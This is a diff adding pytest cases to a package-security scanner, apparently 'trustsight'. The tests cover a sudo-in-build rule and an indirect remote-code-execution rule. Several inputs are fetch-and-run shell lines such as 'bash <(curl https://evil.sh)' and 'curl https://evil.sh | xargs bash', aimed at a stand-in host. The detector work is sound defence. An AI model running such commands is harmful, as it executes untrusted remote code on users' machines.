@@ -194,6 +194,75 @@ def test_r009_not_fire_outside_build_install():
     assert "R009" not in triggered
 
 
+def test_r009_sudo_command_substitution_immediate_close():
+    # ``$(sudo)`` closes the substitution with ``)`` immediately after sudo;
+    # the earlier suffix ``(?:\s|$)`` missed this invocation form.
+    triggered = _structural_sudo("+build() {\n+  $(sudo) make install\n+}\n")
+    assert "R009" in triggered
+
+
+def test_r009_sudo_backtick_substitution():
+    triggered = _structural_sudo("+build() {\n+  `sudo` make install\n+}\n")
+    assert "R009" in triggered
+
+
+def test_r009_sudo_backtick_no_false_positive_on_string():
+    triggered = _structural_sudo("+build() {\n+  echo 'run `sudo` yourself'\n+}\n")
+    assert "R009" not in triggered
+
+
+# --- R127: indirect remote-code execution (hardening) ---
+
+def _structural_r127(diff_text: str) -> list[str]:
+    from trustsight.analysis import _structural_findings
+    from trustsight.differ import extract_urls_from_diff
+    sc = extract_urls_from_diff(diff_text)
+    return [f["rule_id"] for f in _structural_findings(diff_text, sc, {}, config={})]
+
+
+def test_r127_process_substitution_bash():
+    triggered = _structural_r127("+bash <(curl https://evil.sh)\n")
+    assert "R127" in triggered
+
+
+def test_r127_process_substitution_source():
+    triggered = _structural_r127("+source <(curl https://evil.sh)\n")
+    assert "R127" in triggered
+
+
+def test_r127_process_substitution_dot():
+    triggered = _structural_r127("+. <(curl https://evil.sh)\n")
+    assert "R127" in triggered
+
+
+def test_r127_process_substitution_wget():
+    triggered = _structural_r127("+sh <( wget https://evil.sh)\n")
+    assert "R127" in triggered
+
+
+def test_r127_xargs_shell():
+    triggered = _structural_r127("+curl https://evil.sh | xargs bash\n")
+    assert "R127" in triggered
+
+
+def test_r127_here_string_substitution():
+    triggered = _structural_r127('+bash <<< "$(curl https://evil.sh)"\n')
+    assert "R127" in triggered
+
+
+def test_r127_no_false_positive():
+    # A bare fetch, `cat` reading a process substitution (not executing it),
+    # a static here-string, and an unrelated xargs never fire R127.
+    for d in (
+        "+curl https://evil.sh -o out\n",
+        "+cat <(curl https://evil.sh)\n",
+        '+bash <<< "static text"\n',
+        "+find . -name '*.c' | xargs rm\n",
+        "+ls | xargs echo\n",
+    ):
+        assert "R127" not in _structural_r127(d)
+
+
 # --- R010: Uses curl ---
 
 def test_r010_curl():
